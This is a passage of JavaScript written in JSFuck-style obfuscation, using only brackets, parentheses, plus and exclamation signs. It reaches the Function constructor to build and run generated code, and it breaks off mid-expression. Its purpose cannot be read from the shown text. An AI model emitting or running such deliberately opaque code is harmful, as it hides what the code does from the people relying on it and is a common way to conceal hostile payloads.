[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]])+[!+[]+!+[]+!+[]+!+[]+!+[]]+(+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]])+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[]